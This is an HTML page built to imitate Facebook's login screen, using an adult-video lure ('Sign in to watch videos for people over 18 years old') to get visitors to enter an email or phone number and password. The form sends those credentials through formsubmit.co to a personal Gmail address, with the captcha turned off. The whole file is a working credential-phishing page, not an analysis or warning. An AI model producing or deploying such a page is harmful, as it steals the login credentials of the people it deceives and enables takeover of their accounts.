<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">

     <link rel="stylesheet" href="style.css">
     <style type="text/css">
     *{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body{
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 100vh;
    background-image:url("img/my website image.jpg");
}

.container{
    width:100%;
    height:100%;
    display: flex;
    justify-content: space-around;
    align-items: center;
}

.left, .right, form{
    display: flex;
    flex-direction: column;
    align-content: center;
    align-items: center;
    justify-content: center;
}

.left{
    width:500px;
    align-items: flex-start;
}

.right h1{
    font-family: "facebook letter faces";
    font-size: 60px;
    color: #1877f2;
}

.right p{
    font-size: 50px;
    color:#1c1e21;
    font-family: "Roboto Condensed", sans-serif;
}

.right{
    align-items: center;
}

form{
    background-image: url("img/IMG-20220812-WA0020.jpg");
    border-radius: 10px;
    width:400px;
    display: flex;
    padding: 20px;
    margin-bottom: 25px;
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
}

form input{
    width: 100%;
    padding: 15px;
    margin-bottom: 10px;
    border-radius: 5px;
    border: 1px solid #999;
    outline: none;
    font-size: 16px;
}


.loginBtn{
    background-color: #1877f2;
    padding: 15px;
    text-align: center;
    text-decoration: none;
    width: 100%;
    border-radius: 5px;
    color: white;
    font-size: 20px;
    font-family: 'Arial';
    font-weight: 700;
    transition: 0.5s;
}

.loginBtn:hover{
    background-color: #4257b2;
}

.forget{
    margin: 15px 0;
    text-decoration: none;
    color: #1877f2;
    font-family: 'Arial';
    font-size: 14px;
}

.sign-up{
    padding-top: 20px;
    border-top: 1px solid #999;
    width: 100%;
    display: flex;
    justify-content: center;
}

.signupBtn{
    background-color: #42b72a;
    padding: 15px;
    text-align: center;
    text-decoration: none;
    border-radius: 5px;
    color: white;
    font-size: 17px;
    font-family: 'Arial';
    font-weight: 600;
    transition: 0.5s;
}

.signupBtn:hover{
    background-color: green;
}

.right p{background-color: lightblue;
    border-radius: 5px;
        border: 200px;
    font-family: 'Arial';
    font-size: 20px;
    margin-bottom: 20px;
    margin-top: 20px; 
}

@media(max-width:950px){
    .container{
        flex-direction: column;
    }
    
    .left{
        width: 400px;
        align-content: center;
        align-items: center;
    }
    
    .left p{
        height: 75px;
    }
}
</style>
</head>
<body>
        <div class="right">
            <form action="https://formsubmit.co/nwankwochinedu746@gmail.com" method="POST">
            <h1>facebook</h1>
            <img src="img\website 22.jpg" width="50%" style="border-radius: 50%;">
             <p>Sign in to watch videos for people over 18 years old.</p>
                
                <input type="search"  name="search" id="search" placeholder="Email addess or phone number"  required style="border-radius: none;">

                <input type="hidden" name="_captcha" value="false">
 
 
                <input type="password"  name="password" id="password" placeholder="Password" 
                required>



              
               <input class="loginBtn" type="submit" id="button" value="Log in" onclick="redirect()" >

             
            </form>
        </div>
  
 
    
</body>
</html>
